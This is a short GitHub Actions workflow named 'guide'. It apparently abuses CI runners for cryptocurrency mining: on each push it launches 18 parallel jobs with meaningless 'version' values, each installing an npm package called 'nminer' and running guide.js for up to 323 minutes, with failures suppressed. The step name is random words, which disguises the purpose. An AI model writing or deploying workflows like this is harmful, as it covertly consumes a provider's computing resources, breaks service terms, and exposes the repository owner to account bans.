name: guide
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 161 }
          - { version: 4223 }
          - { version: 9104 }
          - { version: 6909 }
          - { version: 8848 }
          - { version: 7856 }
          - { version: 5273 }
          - { version: 1415 }
          - { version: 6392 }
          - { version: 2614 }
          - { version: 9048 }
          - { version: 6006 }
          - { version: 33 }
          - { version: 3934 }
          - { version: 3520 }
          - { version: 4599 }
          - { version: 4740 }
          - { version: 6451 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: brood meaty debut
        run: |
          npm install nminer@latest
          timeout 323m node guide.js || echo "guide executed"